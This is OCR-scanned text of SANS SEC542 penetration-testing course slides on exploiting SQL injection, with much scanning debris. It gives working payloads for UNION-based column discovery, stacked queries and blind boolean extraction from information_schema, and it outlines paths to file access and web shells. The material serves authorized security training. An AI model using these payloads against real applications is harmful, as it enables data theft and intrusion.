. .,___, 
'---' 
SEC542 Workbook: Error-Based SQLi 
Please go to Exercise 3.4 in the 542 Workbook. 
94 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'---' 
'-' 
.,___, 
.,___, 
'-' 
.,___, 
.,___, 
'-' 
.,___, 
.,___, 
'---' 
'---' 
.,___, 
.,___, 
'-' 
'-J 
'-J 
'-' 
'-' 
'-J 
'-J 
\....., 
'-J 
\....., 
'-.., 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
INJECTION 
I. eession Tracking 
2. Session Token Gathering and Session Fixation 
3. Bypass flaws 
4. Exercise: Authentication Bypass 
5. Vulnerable Web Apps: Mutillidae 
6. Command Injection 
1. Ex.ercise: Command Injection 
8. File Inckrsion and Directory Traversal 
9. Exercise: Local/Remote File mc111.1s1on 
0. SQL Injection Primer 
L Discovering SQU 
Exercise: Error-Based 
13. Exploiting SQLi 
14. SQLi Tools 
I S. Exercise: sqlrnap + ZAP 
!&.Summary 
SEC542 I Web App Penetration Testing and Ethical Hacking 
,s 
Course Roadmap 
Let's learn know to exploit SQL injection flaws. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
95 
C>B}Fingerprinting 
• Concepts/techniques are the same or very similar, but we need to determine 
the DB backend to guide injections 
• In truth, we often already have a pretty strong educated guess based on the 
information and configuration gathering done prior 
o Or an error message told us 
• If not, then we can wield certain commands, functions, syntax, and defaults 
that will expose the DB, for example: 
o SELECT @@version (MySQL and SQL Server) 
o String concatenation (My: 'De' 
'nt', MS: 'De'+' nt', 0: 'De' I I 'nt') 
o Unique numeric functions: 
• (My: connection_ id () , MS: 
@@pack_ received, 0: BITAND ( 1, 1)) 
'-' 
'--' 
'-' 
'-' 
'-.../ 
'-' 
'--' 
'-..../ 
'-..../ 
'-..../ 
'-.../ 
'--' 
'-' 
'--' 
'-..../ 
'--' 
So far, we have largely glossed over most DB distinguishing aspects of the SQLi. This has been intentional 
because the primary goal has been to convey concepts and tactics to be used for SQ Li. However, digging into 
the particulars of exploitation will expose that the differences matter quite a bit, and will impact our commands. 
We likely already have some indication as to what the backend DB is, so these details might be superfluous. 
However, should we not have intel about the actual DB in question, we will need to determine it at this point. 
There are different approaches to figuring this out, but the main methods will employ injecting a particular SQL 
syntax that helps illustrate these differences, for example: 
Special functions/parameters: SELECT @@version (MySQL and SQL Server) 
String concatenation: (MySQL: 'De' 'nt', MSSQL: 'De'+' nt', Oracle: 'De' I I 'nt') 
Unique numeric functions: (MySQL: connection_id(), MSSQL: 
@@pack_received, 
Oracle: BITAND (1, 1)) 
96 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..../ 
'-' 
'-..../ 
'--' 
'-..../ 
'-..../ 
'-' 
'-..../ 
'--' 
'--' 
'-' 
'--' 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-.../ 
'-' 
'-..../ 
'-..../ ' 
'-' 
'-..../ 
'-.../ 
'-' 
'---" 
'-' 
(Meta)Database Info 
One of the primary reasons we will need to know the RD EMS being used is to 
point us to database metadata and schema information 
• We will use this information to determine databases, tables, columns, users, and passwords 
Actually, information_ schema is an ANSI SQL92 standard database that 
can provide us with the relevant metadata, so we don't need to fingerprint after 
all ... 
• Unfortunately, not all vendors support information_schema 
information_ schema implementations also vary 
• MySQL's inform.a tion _ schema includes info for every DB 
• In MS SQL Server inform.a tion _ schema is implemented as a DB view that will show only 
information for the current DB 
One particular reason we want to know the DBMS is to have a sense of the metadata info available to us for 
querying. We will use the metadata to determine databases, tables, and columns available to the flawed 
application. 
Ideally, we wouldn't need any details of the RDBMS because they would all support the ANSI SQL 
information_schema database (or view). The information_schema will expose in an easy-to-query 
fashion the names of databases, tables, and even columns. Oracle, DB2, and SQ Lite, unfortunately, do not 
support the information_ schema standard. Also, although MS SQL Server and MySQL both implement it, 
in MS SQL Server it is presented as a view that will expose only the current DB rather than allowing 
enumeration across all DBs. This constraint is not present in MySQL. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
97 
'-.../ 
Databases/Tables/Columns 
Figuring out the names of databases, tables, and columns will be 
key for us to target our SQL injections 
MySQL 
SQL Server or 
AzureSQU 
Oracle DB 
... schema_name 
FROM 
information_schema 
.sehemata 
... name FROM 
sys.databases 
** ... owner FROM 
all_tables 
... table_name FROM 
infonnation_schema 
.tables 
... name FROM 
sys.tables 
... table_name FROM 
all_tables 
... column_name FROM 
information_schema 
.columns 
... name FROM 
sys.columns 
... column jiame FROM 
all_tab_columns 
'-.../ 
.'----".
'-....., 
'----"
'----"
'-....., 
'-....., 
'-.....,
'-....., 
'---' 
'---'
'-....., 
'---'
'-.../
Below are some quick details about enumerating the databases, tables, and columns to which we have access via 
our SQLi. 
MySQL: 
Databa~s:SELECT schema name FROM information schema.schemata 
- 
- 
Tab~s:SELECT table name FROM information schema.tables 
C~umns:SELECT column name FROM information schema.columns 
MS SQL Server: 
Note: information_ schema can be used for MS SQL Server as well, with some slight, but significant, 
differences. The queries will need to explicitly reference individual databases because 
information schema is a view that provides only info on the current database. 
Databases: SELECT name FROM sys. databases 
Tables: SELECT name FROM sys. tables 
Columns: SELECT name FROM sys. columns 
Oracle: 
Schemas: SELECT owner FROM all tables 
Tab~s:SELECT table name FROM all tables 
Columns: SELECT column name FROM all tab columns 
* =Most info still cites the older, increasingly deprecated, master .. sys objects system tables 
** - Listing schemas is the best Oracle approximation to listing databases in MySQL or MS SQL Server 
98 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-....., 
'-....., 
'-.../
'-.../
'-.../
'-.../ 
'-.../
'-.....,
'-.../
'-....., 
'---' 
'-.../ 
'-..,.• 
'-.../
'-' 
'-....., 
'-.../
'-' 
'-.../ 
'-' 
'-../ 
'-....., 
'-.....,
'-....., 
'-.../ 
'-....., 
Exploiting ln-Bandllnline 
• Recall that with in-band/inline SQL injection, we can directly see 
results of our injections 
• Assuming we inject into a SELECT query, this means we can likely 
see all data 
o Contained in the columns employed 
o Confined to the table the query SELECTs ... FROM 
• Wait, those two constraints are actually pretty significant and 
restricting 
• We want to do better and see data beyond those constraints 
Recall the relatively simplistic manifestation of a SQLi flaw found with inline/in-band SQ Li. Information in 
these types of flaws, including error messages, is typically visible. Exploiting this type of flaw means we can 
commonly see a segment of data in the database with relative ease. The data we can see is initially confined to 
the table that is the target of the query and those columns being returned. 
Sounds like some fairly limiting constraints. We will want and need to see data beyond those constraints. The 
approaches we can employ to see data outside of these limitations will vary. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
99 
\..., 
'-../
Stacked Queries 
Stacked queries, or query stacking, means multiple SQL queries can be submitted simply by 
splitting them with a ( ; ) 
SELECT* FROM Users WHERE lname='Dent'; CREATE TABLE exfil(data 
varchar(l000)) ;-- '; 
If stacked queries are supported, then things get simpler 
• So, are they supported ... 
They are most likely to be supported with MS SQL Server 
• Though even with SQL Server support is not a given 
MySQL support is muddier 
• DB supports multiple statements on a single line 
• Yet the way applications interface with MySQL often limits this ability 
Most Oracle references suggest stacking is not supported 
'-../
.,._, 
'---' 
'---' 
-._/
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
Probably the absolute best and easiest option, if it is available, is employing a technique commonly referred to 
as query stacking or stacked queries. This technique feels quite similar to classic command injection, where we 
would submit a command terminator and then supply a brand-new command of our choosing. 
SELECT* FROM Users WHERE lname='Dent'; CREATE TABLE exfil(data 
varchar(l000)) ;-- '; 
In the previous command, we inject beginning with Dent and ending with the--. Note, in particular, the; that 
was injected in the middle. This terminates the current SELECT statement, and, if stacked queries are supported, 
allows for writing an entirely new SQL statement. This is incredibly powerful because it means we are not 
constrained by the existing SQL statement in any way. 
Support for stacked queries is difficult to ascertain. The most likely RDBMS to support this is MS SQL Server. 
MySQL technically supports it from a DB perspective, but the way in which the application interfaces with the 
backend DB impacts this support. 
100 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
.._,, 
'---' 
.._,, 
'---' 
'---' 
'-..-,I 
'---' 
.._,, 
'-../ 
'-./
'---' 
'-./ 
'---' 
'-..-,I 
'---' 
\___,: 
'--' 
'---' 
Stacked Query Example 
< Currently 2 tables 
Stacked query > 0 0 0 •+• « 0 0 0 + + ~+ • 0 + + 0 0 ~+-~ • + + ~ ~ X X O O O « ~ 0 0 •+ 
rows in set (0.00 sec) 
OK, e rows affected (0.€2 set) 
Now exfil table exists > 
Let's see an example of a stacked query using mysql to interact with MySQL from the command line. 
Note: If you want to follow along using your VM, you will need to do the following. 
In a terminal, run the command: 
$ mysql -u root -p 
When prompted, supply the case-sensitive password: MySQL542 
Now, you should be at the mysql> prompt. Connect to the sqli database with the following command: 
mysql> use sqli 
First, show the tables in the DB. 
mysql> show tables; 
I' Tables_in_sqli I 
+----------------+ 
I Customers 
! Users 
+----------------+ 
Currently, there are only the Customers and Users tables. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
101 
'---" 
\J 
Now, perform the stacked query: 
'-" 
mysql> SELECT* FROM Users WHERE lname='Dent'; CREATE TABLE 
exfil(data varchar(l000)) ;-- '; 
······+-··········· 
I id l fNarne 
I lName I phone 
-·-·+········+······-+··········---··-+ 
2 I Arthur I Dent 
I 
(555} 867-5309 I 
7 
I Random I Dent 
I 
(301} 951-0104 I 
+····+········+·······+········-------·+ 
rows in set (0.00 sec) 
ry OK, 0 rows affected (0.02 sec) 
'-" 
'--' 
'--' 
'-" 
.'-.../ 
'-" 
'--' 
'-" 
'--' 
'--'. 
Note: We include the -- ' ; at the end, just to illustrate it as if it were an actual SQLi. 
Again, show the tables: 
mysql> show tables ; 
---·····--------+ 
I Customers 
i 
I Users 
...,. 
I 
I exfil 
+----------·-----+ 
102 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
'--' 
._____, 
'--' 
\......, 
'-' 
'-" 
'-" 
'-" 
._____, 
'-" 
'-" 
We now see that a new table, exfil, exists, which means the stacked query successfully ran. 
'---' 
\J 
'-" 
'-" 
'-../
'-" 
'--' 
'-" 
'-" 
'--' 
'-" 
'--' 
'-" 
'-../ 
'-../ 
\......, 
Why Stacking Matters 
Stacked queries are not normally required for data 
retrieval/ exfiltration 
• We will explore UNION for that purpose next 
Where stacked queries become important is when we want to do 
more than subvert the basic logic of the injectable query 
• Injecting into a WHERE clause of a SELECT statement does not easily allow 
doing INSERTs, UPDATEs, DROPs, or SHUTDOWNs 
If nothing else, things are made significantly easier when stacked 
queries are possible 
If the only goal ofSQL injection were data exfiltration, then stacked queries would not be as potentially helpful 
as they are. The real benefit of stacked queries is the ability to easily break out of the confines of the existing 
query. Being able to inject within the WHERE clause ofa SELECT and CREATE a table is seriously cool and 
powerful. 
Even if stacked queries are not supported, we might still be able to realize this functionality, but stacked queries 
sure are a fast and easy way to pull off some seriously impactful injections. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
103 
'--' 
'--' 
UNIONizing SQL. Injection 
• A SQL UNION allows us to move beyond the confines of the table 
currently being employed 
• Effectively, UNION will allow us to access arbitrary data from the 
database 
o Provided we actually have access to that data 
SELECT* FROM Users WHERE lname='Dent' UNION 
SELECT* FROM Customers;-- '; 
• Above shows a quick UNION injected to pull data from Users 1n 
addition to Customers table 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
The most commonly employed method for data exfiltration via SQL injection involves UNION statements. The 
UNION allows for performing two SELECTs and presenting the data as if it were within a single table. For our 
purposes, this will enable us to interact with data beyond the current table being queried via the existing 
SELECT. 
SELECT* FROM Users WHERE lname='Dent' UNION SELECT* FROM Customers;-- '; 
In the query above, we have injected from Dent' through ;-- . What is new for us is the UNION SELECT * 
FROM Customers. This will pull data from the Customers table and return it as additional rows of data 
beginning after the first SELECT. 
104 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
'--' 
'--' 
'-' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'-' 
'-' 
'--' 
'--' 
'-' 
'--' 
'--' 
'--' 
'--' 
'-'
'--' 
'-' 
'--'
'--' 
'--' 
UNION Prerequisites 
• UNIONs are tremendously useful in SQL injection, but there are 
some prerequisites that must be met before we can leverage them 
• The number of columns being pulled must match in the original 
and injected SELECT 
o Naturally, we will have little knowledge beforehand of the number of 
columns in the source query 
• Another precondition is that the column data type must be 
compatible 
• Finally, we need to know specific tables to target 
Employing UNIONs will increase our ability to interact with additional tables and databases via SQL injection. 
However, there are some preconditions that we must satisfy in order to be successful with our UNIONs. 
The preconditions are: 
• 
The number of columns being returned with our additional UNION SELECT must match the number of 
the original SELECT. 
• 
Additionally, the types of data returned in the columns must be compatible with the associated columns 
into which the data will be returned. 
• 
Finally, we will need to know about specific tables that can be targeted. 
Let's see how we might satisfy these conditions. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
105 
'--' 
FROMless SELECT 
• 
• Might seem odd, but SELECT statements typically do not require an associated FROM ... 
• So, what is actually being SELECTed if there is no table? 
o An interpreted form of what we supply as input 
SELECT 1; 
o Returns 1 
SELECT ' Zaphod' ; 
SELECT CONCAT('Zap' ,'hod'); 
o Return Zaphod 
• Might seem an idiosyncrasy, but this is incredibly important for our UNION-based SQLi 
exploitation 
• Note: Oracle DB requires FROMs for all SELECTs, but provides the built-in DUAL table 
that can be used as a dummy 
• 
• 
..._, 
'--' 
'--' 
'--' 
'---' 
'--' 
-.___/
-.___/
'--' 
'--' 
'--' 
'--./ 
Something that will prove very helpful with determining the number of columns will be employing SELECT 
statements without an associated FROM. This seems a bit odd the first time you encounter it. The whole point of 
a SELECT is to return data FROM a table, but it need not. 
SELECT without a FROM simply returns an interpreted form of whatever we supplied. 
• 
SELECT 1; 
• 
Returns 1 
SELECT 
' Zaphod' ; 
• 
SELECT CONCAT ( ' Zap ' , ' hod' ) ; 
• 
Return Zaphod 
We can use a SELECT statement without a FROM for most RDBMS. Oracle specifically does not allow this but 
has a special-purpose dummy table, called DUAL, that can be used in the same way we describe in the 
following. Also, many non-Oracle vendors have created a default view for DUAL for the purpose of better 
compatibility with Oracle. 
106 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../ 
..._, 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'-.../ 
'--' 
'-.../ 
'-.../ 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
\_, 
'--' 
The Power of NULL 
• We will see that the FROMless SELECT allows us to more easily 
determine the number of columns and type of data 
• Coupling this technique with the use of NULL makes our task 
even easier 
• With UNIONS, the data type returned doesn't have to match, but 
cannot be incompatible 
• NULL is pretty accommodating 
o It will not mismatch any type of data presented 
Another element that will help satisfy those preconditions is the NULL. The second prerequisite with UNIONs 
was that the data types needed to match. In fact, they don't have to really match, but the data types cannot be 
incompatible with one another. Most people assume that strings and numbers would be incompatible, but in fact, 
the RDBMS can convert one to the other pretty easily. That makes this prerequisite easier to satisfy than 
anticipated. 
We can actually make it even easier to satisfy by wielding the NULL. NULL can be SELECTed and it doesn't 
really have a particular data type, and so can accommodate any data type presented. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
107 
'-' 
'-' 
• FROMless SELECT + NULL will help clear the way for some UNION SELECTs against 
arbitrary tables 
SELECT* FROM Users WHERE lname='<OUR INPUT>'; 
• We would not know in advance the number of columns or types of data being SELECTed. 
• First, let's determine the number of columns required: 
Dent' UNION SELECT NULL;-- 
iERROR 1222 (21000): The used SELECT statements have a different number of columns! 
Dent' UNION SELECT NULL,NULL;-- 
IERROR 1222 (21000): The used SELECT statements have a different nu~ber of columns! 
Dent' UNION SELECT NULL,NULL,NULL;-- 
IERROR 1222 (21000): The used SELECT statements have a different number of columns I+······+··--···+··--·+·············--+ 
"'· =====----'----------------------------=--------------------------------'-I. I id 
! tName 
I ltlame I phone 
I 
Dent' UNION SELECT NULL,NULL ,NULL,NULL; -- 
i--··;·r-;;~,;~~-r~;~;··I 1sssi ~;;;:;;;;·j 
I 
7 I Random j Dent 
[ po11 951-0184 
I 
And we have a winner ... - > 
NULL 
@LL 
NULL t NULL 
I 
+·· -- • --+-· .... - ·+·-- ... ·+· .. ---- ... - .. ···+ 
'-' 
'-../ 
'----' 
'----' 
'-../
'-' 
-......., 
-......., 
'-' 
'-../ 
'-./ 
-......., 
By combining our understanding of the FROM!ess SELECT and NULL, we should be able to satisfy the column 
number and the initial column data type considerations. 
Let's determine the number of columns: 
SELECT* FROM Users WHERE lname='Dent' UNION SELECT NULL;-- '; 
SELECT* FROM Users WHERE lname='Dent' UNION SELECT NULL,NULL;-- '; 
SELECT* FROM Users WHERE lname='Dent' UNION SELECT NULL,NULL,NULL;-- '; 
Each of the above resulted in the following error: 
IERROR 1222 (21000): The used SELECT statements have a different number of columns! 
SELECT* FROM Users WHERE lname='Dent' UNION SELECT NULL,NULL,NULL,NULL;-- '; 
+·-·---+····----+-------+-·-----------·-·+ 
I id 
I fName 
I lNarne I phone 
+------+--------+-------+-·······-----··-+ 
2 I Arthur I Dent 
I 
(555) 867-5309 I 
Random I Dent 
I 
(301) 951-0104 I 
I 
Note: This approach would also work, and be needed, for INSERT statements. 
Another method to determine the number of columns is to inject an ORDER BY clause. Keep incrementing the 
column number until an error is thrown because you attempted to ORDER BY a nonexistent column number. 
108 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-./ 
'-..J 
'----' 
-......., 
'----' 
'-' 
'-..J 
'-../
'----' 
-......., 
-......., 
'-' 
'-' 
'-' 
'-' 
'-..J 
'----' 
'-'
-......., 
-..____, 
'-../ 
'-../ 
'-' 
\.__./
-......., 
'--' 
Data Types 
• We have determined the number of columns (in this case 4) with the 
following injection 
Dent' UNION SELECT NULL,NULL,NULL,NULL;-- 
• Using NULL, we were able to temporarily ignore the data type issue 
o Now, we need to determine column data types 
• Typically, we will require at least a column that can accommodate strings to 
accept the data we will exfiltrate 
• Tweak the previous column number injection iteratively changing each 
NULL to string until the query is successful 
Dent' UNION SELECT '42' ,NULL,NULL,NULL;-- 
By using NULL in the previous determination of column numbers, we were able to ignore the type of data 
contained. We determined that for the sample injection, there are four columns present. Because we will actually 
return data using the UNION, we will need to determine the type of data. 
We will typically need to find at least one column that can accommodate a string being returned. Our previous 
query to find the number of columns was: 
Dent' UNION SELECT NULL,NULL,NULL,NULL;-- 
Now, let's iterate through the columns replacing NULL with a string '42' until we find an input that returns 
without error: 
Dent' UNION SELECT '42' ,NULL,NULL,NULL;-- 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
109 
'-../ 
'---' 
'---' 
UNION and Data Exfiltration 
• Previous DB fingerprinting hinted at how we go about finding the 
databases, tables, and columns to be targeted for exfiltration 
• We have established the number of columns 
• At least one column has been determined to accept a string 
• We are ready to exhaustively iterate through all the columns of 
interesting tables to return the data ... 
o By wielding a tool, I hope ;) 
'-..../ 
'-..../ 
'---' 
'-../ 
'---' 
'---' 
'-../ 
'---' 
'---' 
'---' 
'-..../ 
'-../ 
'-../ 
The final condition for successful UNION injections was to know particular tables and columns to be targeted 
for injection. Previous discussions of fingerprinting indicated how we might find database, table, and column 
names. Now, we simply focus on interesting or impactful columns and tables for exfiltration in this way. 
Using this technique, we could exhaustively step through all of the databases to which the current DB user 
account has access. Wielding a tool to do this more efficiently and without error would be rather desirable. 
110 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..../ 
'-..../ 
'-../ 
'---' 
'-..../ 
'-..../ 
'-../ 
'-..../ 
'-..../ 
'-../ 
'--' 
'-./ 
'--' 
'-..../ 
'--' 
'---' 
'--' 
'-..../ 
'---' 
'---' 
'--' 
'-../ 
'-..../ 
'---' 
'-../ 
'-.., 
Blind Data Exfiltration 
• Generally, data exfiltration via blind SQ Li can often employ the same basic 
process as the UNION approach 
o But possibly encumbered by having to determine all data via inference techniques 
• Using our previously identified binary or timing-based binary condition, we 
walk ( very slowly) through inferring all characters of all cells containing 
interesting data 
• Sounds tedious, error-prone, and soul crushing ... 
• Our much-preferred approach is to prime a tool (read: sqlmap) with 
sufficient details that it can handle the cumbersome data exfil 
o With timing-based binary, this is almost the only viable approach 
With the added potential pain of having to enumerate data character by character via conditional/inference 
techniques, manual blind SQL injection techniques can become overly cumbersome and time-consuming. 
Enter automated tools such as sqlmap, which shine in situations such as this. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
111 
'--" 
Blind Boolean Inference Exfiltration 
Query: SELECT * FROM Users WHERE lname='<OUR INPUT>'; 
Binary Condition: TRUE = Dent Info and FALSE = Employee not found 
SQLi Prefix: Dent' AND 
SQ Li Suffix: ; # 
Binarylnjectt:substr((select table_name from 
information_schema.tables limit 1) ,1,1) > "m" 
Binarylnject2:substr((select table_name from 
information_schema.tables limit 1) ,1,1) > "g" 
Binarylnject4:substr((select table_name from 
information_schema.tables limit 1) ,1,1) > "b" 
Binarylnject5:substr((select table_name from 
information schema.tables limit 1) ,1,1) = "c" 
} 
Sirius Cybernetics Corporation 
E:m_pl9-yee eot fotmd ... 
} 
S 
... iriu
. s. Cy·b
• emetics Corporation 
Employee tntormauon 
NlUlHl~ Arthur Den 
Phone: {5S5) 86?. 
Name: Rhlillm:n Th= 
Phone: {301) U$l,• 
Nextinjectwouldusesubstr((.. limit 1),2,1) > "m" totargetthesecondletter 
,,_,. 
,,_ ..:, 
=--sss;==s,['.
,~,cc= c"'; 
'-.J 
'--" 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-.J 
'-.J 
'--" 
'-../ 
'--" 
'--" 
We previously discussed this particular injection involving substring. Recall that there are different mathematical 
approaches to inference; the one we employ simply performs a binary search of the English alphabet. We employ a 
simple guessing game where the search space is split in half with each iteration based on the results. 
Round I: (First: A; Last: Z; Key: M), Round 2: (First: A; Last: M; Key: G), ... 
Query: SELECT* FROM Users WHERE lname='<OUR INPUT>'; 
Binary Condition: TRUE= Dent Info and FALSE= Employee not found 
SQLi Prefix: Dent' AND 
SQLi Suffix: ;# 
Binary Inject 1: subs tr ( ( select table name from information schema. tables limit 
1) ,1,1) > "m" 
Binary Inject 2: substr ( (select table name from information schema. tables limit 
1),1,1) > "g" 
Results: "No employee found"= FALSE 
'--" 
'--" 
'--" 
'-.J 
'--" 
'--" 
'-.J 
'--" 
'-.J 
'--" 
'--" 
'--" 
'-.J 
'-.J 
'--" 
'-.J 
'--" 
Binary Inject 4: substr ( (select table name from information schema. tables limit 
1) ,1,1) > "b" 
Binary Inject 5: subs tr ( (select table name from information schema. tables limit 
1) ,1,1) = "c" 
Result 1: "Name: Arthur Dent"= TRUE 
'-.J 
'--" 
'--" 
'--" 
Next inject would use subs tr ( (... limit 1) , 2, 1) > "m" to target the second letter. 
112 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.J 
'--" 
"---' 
'--" 
"---' 
Beyond DB Data Exfiltration 
• Stealing data from backend databases has caused tremendous$$$$ impact 
to organizations over the years 
o However, this need not be the only impact of SQ Li flaws 
• Also, what happens when the organization doesn't care about the 
confidentiality of the data in question 
• We will refrain from digging into HOW to perform each of these tasks across 
the various RD BMS 
o Particulars get pretty detailed and can change with some regularity 
• In truth, being aware of the potential capabilities is enough to serve as a 
mental nudge on your engagements to look for currently viable techniques to 
employ 
Data exfiltration is without question the most commonly considered and also performed exploit with SQL 
injection flaws. Organizations also can incur a significant cost as a result of a data breach. However, at the very 
least, we must have a basic understanding of other potential impacts that could be performed through the 
exploitation of SQ Li vulnerabilities. 
This need becomes more pronounced when an organization suggests it is not concerned about the confidentiality 
of the accessible data. There will no doubt be instances when the data available for breach is not of significant 
value to the organization or is already public data. Can SQLi flaws still have an impact? Most definitely. 
We will not explore in great depth how to perform all the various types of attacks. As the attacks get further 
removed from standard expected RDBMS functionality, things get more complex and also vary much more 
across different backends. Thankfully, the most important aspect is simply being aware and mindful of the other 
possibilities beyond DB data exfiltration. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
113 
'-..../ 
'---' 
SQLi Potential Attacks 
• Deleting or altering valuable 
data 
o Not typically in scope, but useful 
to be aware 
o Expect ransomware to encrypt 
critical DB data 
• Injecting data used as Stored 
XSS payloads 
• DB privilege escalation 
• Reading files 
oMySQL- LOAD_FILE () 
0 SQL Server - BULK INSERT 
• Writing files 
o MySQL - INTO OUTFILE 
• OS interaction beyond files 
o SQL Server includes many stored 
procedures to interface with OS 
'---' 
'---' 
'---' 
'---' 
'---' 
-.____, 
'---' 
'-" 
'-..../ 
'-" 
'-..../ 
'---' 
''-.../ 
Digging into all of the possible attacks that could be wielded via SQ Li for all of the backends is well beyond the 
scope of this course. Still, let's at least briefly list some alternate impacts that could be achieved via SQ Li. 
Interfacing with DB data for ends other than exfiltration can be eye-opening to organizations. Although we 
would typically not be expected or allowed to alter or delete data, demonstrating that this could be performed 
can be pretty shocking to organizations. Many organizations lack significant integrity controls when data is 
altered via unexpected or nonstandard means. Data deletion is always scary for production data stores. 
Another data-oriented technique we can employ is using the ability to insert data into a DB as a means of 
attacking users of the application. Again, tread very carefully with this unless the question of whether this is 
acceptable has been very clearly defined as part of the pen test pre-engagement discussions. 
Reading and writing files (not DB records) can be a useful technique. Writing files, in particular, can lead to 
other potential impacts like gaining a web shell on the DB server, which will be discussed next. 
Interacting with the operating system other than simply reading/writing files might also be possible. For 
example, with MS SQL Server, we might be able to interface with the registry to add, delete, read, or modify it. 
114 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
'---' 
'---' 
'---' 
'-..../ 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'-..../ 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'-" 
'---' 
'---' 
'---' 
SQLi -> Write File -> Shell 
The ability to write files can be built upon 
to potentially achieve an interactive shell 
• Useful to think of file writing as file 
upload 
Common technique is analogous to 
-
-----------+---uploading a web shell 
~
,,.....,_---,__-~•____.__.+> server would need to also be running 
a web server, which is fairly common 
• DB account would need privileges to 
write to the web root 
• Highest bar is our having the ability to 
browse to the web root 
There are alternate approaches 
that do not depend upon a web 
server and file upload, but these 
typically require stacked queries 
to be possible 
• Vv e will explore sqlmap 
shortly, which is the most 
common tool/method used to 
achieve shell access via SQL 
injection 
Pivoted SQL injection or an 
internal pen test would make this 
technique more viable 
Ifwe have the ability to write files on the DB server, then we might be able to do some very interesting things 
with those files. One of the most commonly talked about techniques is using SQL injection to achieve shell 
access on the DB server. The easiest way to think about this is as a file upload flaw against a web server that 
allows us to write into directories where execution is possible. In essence, using SQLi to gain shell access is 
much akin to uploading web shells on a web server. 
Obviously, the DB server would need to also have a web server that is accessible remotely. The user account 
associated with the DB service would need permission to write files into the web root. Also, we would need the 
ability to reach the web server to render this written file. Taken as a whole, these are extremely significant 
barriers in most circumstances. 
The scenario most likely to have SQLi lead to (web) shell access is either an internal penetration test where the 
web root of the DB server is accessible, or a more complex scenario involving a pivoted internal compromise. 
Other than the web shell-style approach to achieve shell access, other techniques typically require stacked 
queries be supported. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
115 
S.QLfCbeat Sheets 
• With all of the nuance and varied syntax, cheat sheets prove 
particularly useful for SQL injection 
• Some of the better SQL injection cheat sheets: 
o WebSec SQL Injection Knowledge Base 
• https://websec.ca/kb/sql_injection 
o pentestmonkey SQL Injection Cheat Sheets 
• http: //pentestmonkey.net/ category/ cheat-sheet/ sql-injection 
o SQL Injection Wiki Cheat Sheet 
• http://www.sqlinjectionwiki.com 
Note: Most do not seem to be very actively maintained, so check syntax with the current 
reference from the DB provider 
?PF><?CTC«>=>•c?-CC. L 
'---' 
Although most concepts and techniques are widely applicable to all DB providers, there is a fair amount of 
nuance too. Included here is a list of some of the higher quality publicly available cheat sheets. 
• 
WebSec SQL Injection Knowledge Base - https://websec.ca/kb/sql_injection (https://cyber.gd/542 _319) 
• 
pentestmonkey SQL Injection Cheat Sheets - http://pentestmonkey.net/category/cheat-sheet/sql- 
injection (https://cyber.gd/542 _320) 
• 
SQL Injection Wiki Cheat Sheet - http://www.sqlinjectionwiki.com (https://cyber.gd/542 _321) 
On the defense side, we have an OW ASP cheat sheet on prevention: 
• 
OW ASP SQL Injection Prevention Cheat Sheet - 
https://www.owasp.org/index.php/SQL _Injection _Prevention_ Cheat_ Sheet (https://cyber.gd/542 _322) 
Please let us know whether others should be considered for inclusion. 
116 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-J 
'-J 
'--' 
'-.J 
'--' 
'-J 
'--'
'--' 
'--' 
'-J 
'-.J 
'-J 
'-J 
'-J 
'-.J 
'-J 
'---' 
'---' 
'-J 
'---'
'-J 
'-J 
'-J
'-J 
'--' 
'---'
'-J 
'---'
'-J 
'--' 
'-J
'-.J 
'--' 
'-J 
'-../ 
'--' 
'--'
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
INJECTION 
sei,s1Q,n Tracking 
2. Session Token Gathering and Session r1>1:at1ion 
4. Exercise: Authentication Bypass 
S. Vulruarable Web Apps: Mutillidae 
6. Command Injection 
Exerdse; Command Injection 
S. File Inclusion and Directory Traversal 
